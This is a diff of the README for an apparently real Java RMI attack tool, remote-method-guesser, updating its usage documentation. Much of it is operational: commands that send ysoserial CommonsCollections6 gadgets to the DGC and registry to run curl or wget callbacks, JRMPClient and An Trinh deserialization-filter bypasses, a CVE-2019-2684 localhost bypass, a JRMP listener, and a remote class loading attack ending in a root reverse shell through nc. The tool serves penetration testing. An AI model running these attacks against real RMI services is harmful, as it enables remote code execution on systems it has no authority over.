@@ -7,11 +7,13 @@ vulnerabilities on *Java RMI* endpoints. Currently, the following operations are
 
 * List available *bound names* and their corresponding interface class names
 * List codebase locations (if exposed by the remote server)
-* Check for known vulnerabilities (enabled class loader, missing *JEP290*)
+* Check for known vulnerabilities (enabled class loader, missing *JEP290*, localhost bypass)
 * Identify existing remote methods by using a *bruteforce* (wordlist) approach
 * Call remote methods with *ysoserial gadgets* within the arguments
 * Call remote methods with a client specified codebase (remote class loading attack)
-* Perform *DGC* calls with *ysoserial* gadgets or a client specified codebase
+* Perform *DGC* and *registry* calls with *ysoserial* gadgets or a client specified codebase
+* Perform *bind*, *unbind* and *rebind* operations against a registry
+* Extend ysoserial gadgets with [An Trinhs registry bypass](https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/)
 * Create Java code dynamically to invoke remote methods manually
 
 During remote method guessing, deserialization and codebase attacks, the argument types of remote method calls
@@ -69,12 +71,16 @@ Positional Arguments:
     action                          One of the possible actions listed below
 
 Possible Actions:
-    attack <gadget> <command>       Perform deserialization attacks
-    codebase <url> <classname>      Perform remote class loading attacks
+    bind <boundname> <listener>     Binds an object to the registry thats points to listener
+    codebase <classname> <url>      Perform remote class loading attacks
     dgc <gadget> <command>          Perform DGC based deserialization attacks
-    dgc-codebase <url> <classname>  Perform DGC based remote class loading attacks
-    enum                            Enumerate bound names and classes
+    enum                            Enumerate bound names, classes, SecurityManger and JEP290
     guess                           Guess methods on bound names
+    listen <gadget> <command>       Open ysoserials JRMP listener
+    method <gadget> <command>       Perform method based deserialization attacks
+    rebind <boundname> <listener>   Rebinds boundname as object that points to listener
+    reg <gadget> <command>          Perform registry based deserialization attacks
+    unbind <boundName>              Removes the specified bound name from the registry
 
 Optional Arguments:
     --argument-position <int>       select argument position for deserialization attacks
@@ -84,9 +90,10 @@ Optional Arguments:
     --follow                        follow redirects to different servers
     --force-legacy                  treat all classes as legacy stubs
     --help                          display help message
-    --json                          output in json format
+    --localhost-bypass              attempt localhost bypass for registry operations (CVE-2019-2684)
     --no-color                      disable colored output
     --no-legacy                     disable automatic legacy stub detection
+    --reg-method <method>           method to use during registry operations (bind|lookup|unbind|rebind)
     --sample-folder <folder>        folder used for sample generation
     --signature <method>            function signature for guessing or attacking
     --ssl                           use SSL for the rmi-registry connection
@@ -102,54 +109,62 @@ Optional Arguments:
 ```
 
 
-#### Enumeration
+#### Enumeration (enum)
 
-The ``enum`` action can be used to list available *bound names* on *RMI registry* endpoints. Additionally, it displays
-the names of the corresponding *Java classes* and shows the servers *codebase*, if available. ``enum`` is the default
-action of *remote-method-guesser* and can either be invoked by only specifying the port and IP address of a target
-or by specifying ``enum`` as action explicitly.
-
-Since version ``v3.1.0``, *rmg* also performs enumeration on known misconfigurations like missing *JEP290* or enabled
-class loading on the *DGC* (*Distributed Garbage Collector*) level. Whereas missing *JEP290* can be detected reliably,
-the possibility for remote class loading cannot be fully verified from the client side without attempting an attack.
+The ``enum`` action performs several checks on the specified *RMI registry* endpoint. It provides a list of all
+available boundnames, displays the servers codebase (if existent), checks for missing *JEP290* and some other
+common vulnerabilities. ``enum`` is the default action of *remote-method-guesser* and can either be invoked by
+only specifying the port and IP address of a target or by specifying ``enum`` as action explicitly.
 
 ```console
-[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090
+[qtc@kali ~]$ rmg 172.18.0.2 9010
 [+] Creating RMI Registry object... done.
 [+] Obtaining list of bound names... done.
 [+] 3 names are bound to the registry.
 [+] 
 [+] Listing bound names in registry:
 [+] 
+[+] 	- plain-server2
+[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
+[+] 	- legacy-service
+[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
 [+] 	- plain-server
 [+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
-[+] 	- ssl-server
-[+] 		--> de.qtc.rmg.server.interfaces.ISslServer (unknown class)
-[+] 	- secure-server
-[+] 		--> de.qtc.rmg.server.interfaces.ISecureServer (unknown class)
 [+] 
 [+] RMI server codebase enumeration:
 [+] 
 [+] 	- http://iinsecure.dev/well-hidden-development-folder/
-[+] 		--> de.qtc.rmg.server.interfaces.ISslServer
+[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub
 [+] 		--> de.qtc.rmg.server.interfaces.IPlainServer
-[+] 		--> javax.rmi.ssl.SslRMIClientSocketFactory
-[+] 		--> de.qtc.rmg.server.interfaces.ISecureServer
 [+] 
-[+] RMI server SecurityManager enumeration:
+[+] RMI server String unmarshalling enumeration:
 [+] 
-[+] 	- RMI server does use a SecurityManager. But access to the class loader is denied.
-[+] 	  This is usually the case when the DGC uses a separate secuirty policy.
-[+] 	  Codebase attacks may work on the application level (maybe vulnerable)
+[+] 	- Server attempted to deserialize object locations during lookup call.
+[+] 	  --> The type java.lang.String is unmarshalled via readObject().
+[+] 
+[+] RMI server useCodebaseOnly enumeration:
+[+] 
+[+] 	- Caught MalformedURLException during lookup call.
+[+] 	  --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
+[+] 
+[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
+[+] 
+[-] 	- Caught NotBoundException during unbind call.
+[+] 	  --> RMI registry processed the unbind call and is vulnerable.
+[+] 
+[+] RMI server DGC enumeration:
+[+] 
+[+] 	- RMI server does use a SecurityManager for DGC operations.
+[+] 	  But access to the class loader is denied.
+[+] 	  The DGC uses most likely a separate security policy.
 [+] 
 [+] RMI server JEP290 enumeration:
 [+] 
-[+] 	- DGC rejected deserialization of java.util.HashMap.
-[+] 	  JEP290 is most likely installed (not vulnerable)
+[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
 ```
 
 
-#### Method Guessing
+#### Method Guessing (guess)
 
 When using the ``guess`` operation, *rmg* attempts to identify existing remote methods by sending method hashes
 to the remote server. This operation requires a wordlist that contains the corresponding method definitions in the
@@ -236,7 +251,7 @@ To transform a plain wordlist file into the optimized format, just use the ``--u
 operation. This will update all currently used wordlist files to the optimized format.
 
 
-#### Deserialization Attacks
+#### Method Based Deserialization Attacks (method)
 
 Remote methods that do not only use primitive types within their arguments are often vulnerable to *deserialization attacks*.
 This great [blog post](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/) by [Hans-Martin Münch](https://twitter.com/h0ng10)
@@ -277,22 +292,24 @@ Apart from primitive types, also ``java.lang.String`` can now no longer be used 
 non primitive types are still vulnerable.
 
 
-#### Deserialization Attacks (DGC based)
+#### General Deserialization Attacks (reg|dgc)
 
-Almost each *RMI endpoint* supports calls to a *Distributed Garbage Collector* remote object and the remote methods defined on it are well known.
-In the old days (before *JEP 290*), these *DGC remote methods* could already be used for *deserialization attacks*. With *JEP 290*, deserialization filters
-were implemented for all internal *RMI communication* and *deserialization attacks* are no longer possible. However, identifying unpatched servers
-is still quite common and *rmg* can be used to quickly verify the vulnerability.
+Apart from *remote methods* on the application level, *RMI* endpoints also expose well known *remote* methods that are needed for the internal *RMI communication*.
+In the old days (before *JEP 290*), these internal *remote methods* were vulnerable to exactly the same deserialization attacks as described above. However,
+with *JEP 290* deserialization filters were implemented for all internal *RMI communication* and deserialization attacks were (theoretically) no longer possible. 
 
-During the *enum* action, *rmg* already checks whether *JEP290* is installed on the targeted server. For testing purposes we can use the [example-server](https://github.com/qtc-de/beanshooter/packages/398561)
-of the [beanshooter](https://github.com/qtc-de/beanshooter) project, which is running an unpatched version of *Java*. The following output shows
-that *rmg* can identify the missing *JEP 290* installation:
+During it's *enum* action, *remote-method-guesser* already checks whether *JEP290* is installed on the targeted server. For testing purposes you can use the
+[example-server](https://github.com/qtc-de/beanshooter/packages/398561) of the [beanshooter](https://github.com/qtc-de/beanshooter) project, which is running
+an unpatched version of *Java*. The following output shows that *remote-method-guesser* successfully identifies the missing *JEP 290* installation:
 
 ```console
 [qtc@kali ~]$ rmg --ssl 172.18.0.2 9010
 [+] Creating RMI Registry object... done.
 [+] Obtaining list of bound names... done.
 [+] 1 names are bound to the registry.
+[+] RMI object tries to connect to different remote host: iinsecure.dev
+[+] 	Redirecting the ssl connection back to 172.18.0.2... 
+[+] 	This is done for all further requests. This message is not shown again. 
 [+] 
 [+] Listing bound names in registry:
 [+] 
@@ -303,19 +320,34 @@ that *rmg* can identify the missing *JEP 290* installation:
 [+] 
 [+] 	- The remote server does not expose any codebases.
 [+] 
-[+] RMI server SecurityManager enumeration:
+[+] RMI server String unmarshalling enumeration:
 [+] 
-[+] 	- RMI server does not use a SecurityManager.
-[+] 	  Remote class loading attacks are not possible (not vulnerable)
+[+] 	- Server attempted to deserialize object locations during lookup call.
+[+] 	  --> The type java.lang.String is unmarshalled via readObject().
+[+] 
+[+] RMI server useCodebaseOnly enumeration:
+[+] 
+[+] 	- Caught ClassCastException during lookup call.
+[+] 	  --> The server ignored the provided codebase (useCodebaseOnly=true).
+[+] 
+[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
+[+] 
+[+] 	Caught AccessException during unbindcall.
+[+] 	The servers seems to use a SingleEntryRegistry (probably JMX based).
+[+] 
+[+] RMI server DGC enumeration:
+[+] 
+[+] 	- RMI server does not use a SecurityManager during DGC operations.
+[+] 	  Remote class loading attacks are not possible.
 [+] 
 [+] RMI server JEP290 enumeration:
 [+] 
-[+] 	- DGC accepted deserialization of java.util.HashMap.
-[+] 	  JEP290 is most likely not installed (vulnerable)
+[+] 	- DGC accepted deserialization of java.util.HashMap (JEP290 is not installed).
 ```
 
-To confirm that the server is really vulnerable you can perform a dedicated *deserialization attack* on the *DGC level*. This can be done
-by using the ``dgc`` action of *rmg*, which allows you to send *ysoserial* gadgets to the *DGC endpoint*:
+To confirm that the server is vulnerable you can perform a dedicated *deserialization attack* on the *DGC level* (*DGC* = *Distributed Garbage Collector*,
+a *remote object* that is available on almost each *RMI endpoint*). This can be done
+by using the ``dgc`` action of *remote-method-guesser*, which allows you to send *ysoserial* gadgets to the *DGC endpoint*:
 
 ```console
 [qtc@kali ~]$ rmg --ssl 172.18.0.2 9010 dgc CommonsCollections6 "curl 172.18.0.1:8000/vulnerable"
@@ -333,8 +365,48 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 172.18.0.2 - - [27/Dec/2020 06:16:00] "GET /vulnerable HTTP/1.1" 404 -
 ```
 
+The callback from the server shows that the attack was successful. With *JEP290* installed, the server would have rejected the deserialization instead.
 
-#### Codebase Attacks
+Whereas the deserialization filter on the *DGC* is very strict and there are currently no known bypasses, the *RMI registry* itself needs to allow more
+classes to be deserialized in order to work correctly. This was abused for some bypasses in the past, where the two most prominent bypasses are the
+*JRMPClient* gadget of the [ysoserial project](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/JRMPClient.java) and
+the [RemoteObjectInvocationHandler bypass](https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/) by [An Trinh](https://twitter.com/_tint0).
+Both of them can be used together with *remote-method-guesser's* ``reg`` action and possibly bypass an outdated *JEP290* installation.
+
+Notice that both bypass gadgets cannot be used to execute code directly. Instead they create an outbound *RMI* connection, which is no longer protected
+by the deserialization filters. This outbound channel can now be used for deserialization attacks. The most common way to do this is probably using
+[ysoserials JRMPListener](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java) and since it is so common,
+*remote-method-guesser* has bultin a shortcut (``listen``) to launch this listener.
+
+```console
+[qtc@kali ~]$ rmg 172.18.0.2 9010 reg JRMPClient 172.18.0.1:4444
+[+] Creating ysoserial payload... done.
+[+] 
+[+] Attempting deserialization attack on RMI registry endpoint...
+[+] 
+[+] 	Caught ClassCastException during deserialization attack.
+[+] 	The server uses either readString() to unmarshal String parameters, or
+[+] 	Deserialization attack was probably successful :)
+
+
+[qtc@kali ~]$ rmg 0.0.0.0 4444 listen CommonsCollections6 "wget 172.17.0.1:8000/vulnerable"
+[+] Creating a JRMPListener on port 4444.
+[+] Handing off to ysoserial...
+* Opening JRMP listener on 4444
+Have connection from /172.18.0.2:40704
+Reading message...
+Is DGC call for [[0:0:0, -1407888899]]
+Sending return with payload for obj [0:0:0, 2]
+Closing connection
+
+
+[qtc@kali www]$ web
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+172.18.0.2 - - [08/Jan/2021 08:43:14] "GET /vulnerable HTTP/1.1" 200 -
+```
+
+
+#### Method Based Codebase Attacks (codebase)
 
 In 2011, many *Java RMI* endpoints were vulnerable to *remote class loading* attacks due to an insecure by default configuration within the *RMI* implementation.
 Today, this vulnerability can still be present if an application server sets the ``useCodebaseOnly`` option to ``false`` and uses a *SecurityManager* with a
@@ -382,7 +454,7 @@ Whereas the *internal RMI communication* is well protected, *RMI communication* 
 names.
 
 ```console
-[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090 codebase http://172.18.0.1:8000 Example --signature "String login(java.util.HashMap dummy1)" --bound-name secure-server
+[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090 codebase Example http://172.18.0.1:8000 --signature "String login(java.util.HashMap dummy1)" --bound-name secure-server
 [+] Connecting to RMI registry... done.
 [+] Obtaining a list of bound names... done.
 [+] 3 names are bound to the registry.
@@ -473,30 +545,39 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 
-#### Codebase Attacks (DGC based)
+#### General Codebase Attacks (codebase)
 
-As previously mentioned, the internal *RMI communication* of modern *RMI servers* is hardened against *codebase* and *deserialization attacks*.
-Nonetheless, *remote-method-guesser* also supports *codebase attacks* on the *DGC* level and allows you to verify the vulnerability on older
-*RMI endpoints*. In theory, everything should work as for the method based codebase attacks mentioned above, but without specifying a method
-signature:
+As previously mentioned, the internal *DGC communication* of modern *RMI servers* is hardened against *codebase* and *deserialization attacks*.
+Nonetheless, *remote-method-guesser* also supports *codebase attacks* on the *DGC* and *RMI registry* level and allows you to verify the
+vulnerability on older *RMI endpoints*. In case of the *RMI registry*, it turns out that class loading is even possible on fully patched
+endpoins, if the ``useCodebaseOnly`` property is set to ``false`` and the *SecurityManager* allows the requested action of the payload class.
 
 ```console
-[qtc@kali ~]$ rmg --ssl 172.18.0.2 9010 dgc-codebase http://172.18.0.1:8000 Exmaple
-[+] Attempting codebase attack on DGC endpoint...
-[+] Sending serialized class Exmaple with codebase http://172.18.0.1:8000
+[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090 codebase Example 172.18.0.1:8000 --signature reg
 [+] 
-[-] 	DGC accepted deserialization of class Exmaple.
-[-] 	However, the attacking class could not be loaded from the specified endpoint.
-[-] 	The DGC is probably configured with useCodeBaseOnly=true (not vulnerable)
-[-] 	or the file Exmaple.class was not found on the specified endpoint.
+[+] Attempting codebase attack on RMI registry endpoint...
+[+] Using class Example with codebase http://172.18.0.1:8000/ during lookup call.
+
+[qtc@kali www]$ web
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+172.18.0.2 - - [08/Jan/2021 06:55:59] "GET /Example.class HTTP/1.1" 200 -
+
+[qtc@kali ~]$ nc -vlp 4444
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 172.18.0.2.
+Ncat: Connection from 172.18.0.2:40748.
+id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Unfortunately, even the outdated *RMI server* from the [beanshooter](https://github.com/qtc-de/beanshooter) project is no longer vulnerable
-and the functionality is currently untested. This documentation will be updated once I find a vulnerable endpoint again. If you encountered a
-vulnerable server, please provide some feedback :)
+However, notice that the payload class needs to extend the ``java.rmi.server.RemoteObjec`` class in order to be accepted by the
+deserialization filters. Codebase attacks on the *DGC* can also be launched theoretically by using the ``--signature dgc`` option.
+However, this has not been tested so far.
 
 
-#### Sample Generation
+#### Sample Generation (--create-samples)
 
 Despite being none of the available actions, *sample generation* is another useful feature of *remote-method-guesser* and can be enabled
 during the ``guess`` action. In some situations, *RMI* endpoints expose methods that sound interesting on their own, without thinking
